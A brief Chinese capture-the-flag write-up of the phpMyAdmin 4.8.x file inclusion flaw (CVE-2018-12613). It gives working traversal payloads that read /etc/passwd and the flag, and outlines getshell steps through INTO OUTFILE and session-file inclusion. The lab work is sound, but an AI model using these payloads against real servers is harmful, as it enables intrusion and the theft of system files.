CVE-2018-12613phpMyAdmin 后台文件包含漏洞

漏洞影响范围

  phpMyAdmin 4.8.0和4.8.1

漏洞利用方法
?target=db_sql.php%253f/../../../../../../etc/passwd 
他会包含这个文件，其中target值会被解析成db_sql.php%3f/../../test.txt，因为php会把前面db_sql.php%3f当成目录
所以要多加一个../来跳出此目录，执行后面语句。

解题过程

dirsearch 扫描目录
  1. 打开题目就一串文字其它啥都没有，然后源码也没有提示。那就扫扫看咯。
  2. 使用 命令python dirsearch.py -u http://ab40b574-cfa2-4a68-8f57-04f4765c30b0.node3.buuoj.cn/ -e php 可以扫描到：
  3. 进入url/phpmyadmin 可以发现其版本为4.81。
漏洞利用
  1. 经过查找可知phpmyadmin 4.81 存在文件包含漏洞。
  2. 使用 ?target=pdf_pages.php%253f/../../../../../../../../etc/passwd 确定漏洞是否存在。
  3. 经过测试可以知道flag的位置。我们访问 ?target=pdf_pages.php%253f/../../../../../../../../flag 得到flag，大公告成！

补充知识，getshell

  1. 写入文件来getshell要求secure_file_priv不是null，直接通过select ““ into outfile “xxxxxxxx”，写入shell文件。
  2. 通过session达成命令执行。
    • 首先执行select "<?php phpinfo();exit;?>"
    • 然后进行抓包找到Cookie: phpMyAdmin=9sc6qudj1mdc8ita3q558etv41feenh9记录它的值
    • Linux的session保存目录为/var/lib/php/sessions
      这样当前对应的SESSION文件为/var/lib/php/sessions/sess_你的SESSION ID 也有可能在/tmp下（如果改了）
